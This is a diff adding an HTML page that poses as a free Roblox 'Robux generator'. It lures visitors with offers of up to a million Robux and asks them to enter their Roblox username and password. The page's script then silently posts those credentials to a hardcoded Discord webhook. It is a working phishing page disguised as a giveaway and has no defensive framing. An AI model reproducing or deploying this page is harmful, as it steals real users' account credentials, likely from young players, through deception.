@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('bg.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 300px;
+            width: 100%;
+        }
+        .container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .container p {
+            font-size: 14px;
+            color: #ff0000;
+            margin-bottom: 20px;
+        }
+        .container input[type="text"], 
+        .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .container button.login {
+            width: 100%;
+            padding: 10px;
+            background-color: #00cc66;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .container button.login:hover {
+            background-color: #00994d;
+        }
+        .container a {
+            color: #0066cc;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        .container a:hover {
+            text-decoration: underline;
+        }
+        .robux-buttons button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff3333;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+            transition: background-color 0.3s;
+        }
+        .robux-buttons button:hover {
+            background-color: #cc0000;
+        }
+        .robux-buttons button.active {
+            background-color: #00cc66;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p><b>Connect your Roblox account so that we can give you the Robux (Will not work if wrong account details). Unlike other scam generators, this one actually works on all versions of Roblox!</b></p>
+        <h1>Login</h1>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="login">Log In</button>
+        </form>
+        <div class="robux-buttons">
+            <button onclick="selectRobux(this)">100 Robux</button>
+            <button onclick="selectRobux(this)">1,000 Robux</button>
+            <button onclick="selectRobux(this)">10,000 Robux</button>
+            <button onclick="selectRobux(this)">1 Million Robux</button>
+        </div>
+    </div>
+    <script>
+        function selectRobux(button) {
+            const buttons = document.querySelectorAll('.robux-buttons button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            button.classList.add('active');
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const username = event.target.username.value;
+            const password = event.target.password.value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1255892670526656593/jusM-jBIC_civPjKhQVm_PfHO8WfhtWYxxB8LrCBr4Uaob0q_edBvaDLa7kL9wA0rIGz';
+            const message = {
+                content: `Username📛: ${username} ||| Password🔒: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+               
+            });
+        });
+    </script>
+</body>
+</html>
